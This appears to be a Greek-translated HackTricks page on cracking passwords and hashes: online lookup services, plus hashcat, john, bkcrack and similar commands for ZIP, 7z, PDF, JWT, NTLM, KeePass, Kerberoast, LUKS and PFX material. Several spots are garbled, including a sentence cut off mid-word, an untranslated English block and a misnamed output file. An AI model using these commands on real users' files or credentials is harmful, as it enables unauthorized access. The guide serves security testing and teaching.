### Online βάσεις δεδομένων αποκωδικοποίησης

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με/χωρίς ESS/SSP και με οποιαδήποτε τιμή πρόκλησης)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Κρυπτογραφημένα hashes, WPA2 captures, και αρχεία MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Κρυπτογραφημένα hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes και κρυπτογραφημένα αρχεία)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Ελέγξτε αυτά πριν δοκιμάσετε να κάνετε brute force ενός Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Επίθεση γνωστού κειμένου σε αρχείο zip

Χρειάζεστε να γνωρίζετε το **καθαρό κείμενο** (ή μέρος του καθαρού κειμένου) **ενός αρχείου που περιέχεται μέσα** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε τα **ονόματα αρχείων και το μέγεθος των αρχείων που περιέχονται μέσα** σε ένα κρυπτογραφημένο zip τρέχοντας: **`7z l encrypted.zip`**\
Κατεβάστε το [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα κυκλοφορίας.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

### Κωδική δύναμη

Η κωδική δύναμη είναι μια τεχνική επίθεσης που στοχεύει στη διαπραγμάτευση των κωδικών πρόσβασης με τη δοκιμή όλων των πιθανών συνδυασμών μέχρι να βρεθεί ο σωστός κωδικός.

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

Η βίαιη επίθεση (brute force attack) είναι μια τεχνική όπου ο εισβολέας δοκιμάζει συνεχώς διαφορετικούς κωδικούς πρόσβασης μέχρι να βρει τον σωστό. Αυτή η μέθοδος μπορεί να χρησιμοποιηθεί για να αποκτήσει πρόσβαση σε προστατευμένες πληροφορίες όπως αρχεία PDF.

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Κωδικός Ιδιοκτήτη PDF

Για να σπάσετε έναν κωδικό ιδιοκτήτη PDF ελέγξτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### Αποκωδικοποίηση NTLM

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Χτυπώντας το Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Εικόνα Lucks

#### Μέθοδος 1

Εγκατάσταση: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Μέθοδος 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Άλλος οδηγός Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Ιδιωτικό κλειδί PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Χρησιμοποιήστε [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και στη συνέχεια το john

### Open Office Pwd Protected Column

Αν έχετε ένα αρχείο xlsx με μια στήλη που προστατεύεται με κωδικό πρόσβασης μπορείτε να την καταργήσετε:

* **Ανεβάστε το στο google drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
* Για να τον **καταργήσετε** **χειροκίνητα**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Πιστοποιητικά PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Εργαλεία

**Παραδείγματα κατακερματισμού:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Αναγνωριστής κατακερματισμού

```bash
hash-identifier
> <HASH>
```

### Λίστες Λέξεων

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Εργαλεία Δημιουργίας Λιστών Λέξεων**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Γεννήτρια περιπάτου πληκτρολογίου με προηγμένες ρυθμίσεις για βασικούς χαρακτήρες, χάρτη πλήκτρων και διαδρομές.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John μετάλλαξη

Διαβάστε _**/etc/john/john.conf**_ και ρυθμίστε το.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Επιθέσεις Hashcat

* **Επίθεση με λίστα λέξεων** (`-a 0`) με κανόνες

**Το Hashcat** έρχεται ήδη με ένα **φάκελο που περιέχει κανόνες** αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

* **Επίθεση με συνδυασμό λιστών λέξεων**

Είναι δυνατόν να **συνδυάσετε 2 λίστες λέξεων σε 1** με το hashcat.\
Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **"world"** και **"earth"**. Οι λέξεις `helloworld` και `helloearth` θα δημιουργηθούν.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

* **Επίθεση μάσκας** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

* Επίθεση με λίστα λέξεων + Μάσκα (`-a 6`) / Μάσκα + Λίστα Λέξεων (`-a 7`)

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Τρόποι Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

## Brute Forcing Linux Hashes

Η επίθεση με brute force στοιχεία είναι μια από τις πιο δημοφιλείς τεχνικές για την απόκτηση πρόσβασης σε κρυπτογραφημένα δεδομένα, όπως οι κωδικοί πρόσβασης. Στην περίπτωση του Linux, οι κωδικοί πρόσβασης αποθηκεύονται στο αρχείο `/etc/shadow` με κρυπτογραφημένη μορφή. Ο στόχος είναι να χρησιμοποιήσουμε ένα πρόγραμμα για να δοκιμάσουμε διαδοχικά διάφορους κωδικο

```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

## Αποκωδικοποίηση των Hash των Windows

Η αποκωδικοποίηση των hash των Windows μπορεί να γίνει με τη χρήση εργαλείων όπως το John the Ripper, το Hashcat και το Mimikatz. Αυτά τα εργαλεία μπορούν να χρησιμοποιηθούν για να εκτελέσουν επίθεση με brute-force στα hash των Windows, προσπαθώντας να αντιστοιχίσουν το hash με τον πραγματικό κωδικό πρόσβασης. Η επιτυχής αποκωδικοποίηση ενός hash μπορεί να οδηγήσει στην απόκτηση πρόσβασης σε συστήματα Windows χωρίς την ανάγκη για καταστροφικές ενέργειες όπως η επαναφορά κωδικού πρόσβασης.

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

## Brute Force

Brute force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute force attacks can be time-consuming but are effective against weak passwords. There are tools available that can automate the brute force process, such as John the Ripper and Hashcat.

### Using John the Ripper

To perform a brute force attack using John the Ripper, you can use the following command:

```bash
john --format=FORMAT hashfile
```

Replace `FORMAT` with the hash type you are trying to crack and `hashfile` with the file containing the hash you want to crack.

### Using Hashcat

Hashcat is another powerful tool for cracking hashes using brute force. You can use Hashcat with the following command:

```bash
hashcat -m MODE hashfile
```

Replace `MODE` with the hash mode you are trying to crack and `hashfile` with the file containing the hash you want to crack.

Remember that brute force attacks can be resource-intensive and time-consuming, so it's essential to use them responsibly and with proper authorization.

```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε Πρόσβαση Σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
